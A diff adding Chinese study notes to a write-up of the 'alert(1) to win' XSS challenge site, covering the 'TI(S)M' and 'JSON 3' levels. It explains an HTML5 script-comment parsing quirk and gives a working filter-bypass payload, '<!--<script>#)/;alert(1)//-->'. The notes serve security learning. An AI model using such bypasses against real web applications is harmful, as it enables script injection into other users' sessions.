@@ -326,11 +326,85 @@ iframe是html的一个标签，可以在网页中创建内联框架，有个src�
 
 [利用window.name+iframe跨域获取数据详解](https://www.cnblogs.com/zichi/p/4620656.html)
 
+## TI(S)M
+```
+function escape(s) {
+  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
+  function html(s) { return s.replace(/[<>"&]/g, function(s) {
+                        return '&#' + s.charCodeAt(0) + ';'; }); }
+
+  return (
+    '<script>' +
+      'var url = ' + json(s) + '; // We\'ll use this later ' +
+    '</script>\n\n' +
+    '  <!-- for debugging -->\n' +
+    '  URL: ' + html(s) + '\n\n' +
+    '<!-- then suddenly -->\n' +
+    '<script>\n' +
+    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
+    '  else new Image().src = url;\n' +
+    '</script>'
+  );
+}
+```
+
+在html5中如果是 `<!–-<script>` 中的代码都会认为是JavaScript的代码，直到遇到了 `-->` 的结束标识符。
+
+## JSON 3
+```
+function escape(s) {
+  return s.split('#').map(function(v) {
+      // Only 20% of slashes are end tags; save 1.2% of total
+      // bytes by only escaping those.
+      var json = JSON.stringify(v).replace(/<\//g, '<\\/');
+      return '<script>console.log('+json+')</script>';
+      }).join('');
+}
+```
+
+我们需要填写的字符串的格式是payload#payload的格式。那么最后将会被渲染为：
+```
+<script>console.log("payload1")</script><script>console.log("payload2")</script>
+```
+
+这道题目同样是需要用到和 `TI(S)M` 题中一样的html5放入特性。即在html5中，`<!–<script>` 中的代码全部会被认为是JavaScript的代码，直到遇到了 `-->` 的结束标识符。
+
+我们输入`<!--<script>#payload2`
+
+得到：
+```
+<script>console.log("<!--<script>")</script><script>console.log("payload2")</script>
+```
+
+由于 `<!–-<script>` 中的代码都会认为是JavaScript的代码，所以可以将`</`的意义转变，变成 逻辑小于号和正则表达式。
+需要在 `payload2` 中闭合正则表达式，并注意将里面的 `(` 转义或者 将其闭合，正则表达式中的 `()`  `[]`  `{}`有不同的意思。 `()` 是为了提取匹配的字符串。表达式中有几个 `()` 就有几个相应的匹配字符串。否则报错
+```
+Error: Uncaught SyntaxError: Invalid regular expression: /script><script>console.log("/: Unterminated group
+```
+简化下：
+```
+console.log("<!--<script>")   <        /script><script>console.log(")/;       alert(1)
+也就是
+console()    小于号    /正则表达式/ ;  alert(1)
+```
+还要注意在 js中将 `-->` 放在注释里面。
+
+
+payload:
+```
+<!--<script>#)/;alert(1)//-->
+```
+
+
 # 问题总结
 
 什么时候加 【;】
+
+
+
 
 # 参考
 
 [alf.nu/alert1 writeup(1-7)](https://blog.csdn.net/he_and/article/details/79672900)
 [escape.alf.nu XSS Challenges 8-15 之进阶的XSS](https://blog.csdn.net/u012763794/article/details/51526725)
+[XSS练习平台【a/lert(1) to win】](https://blog.csdn.net/taozijun/article/details/81004359)
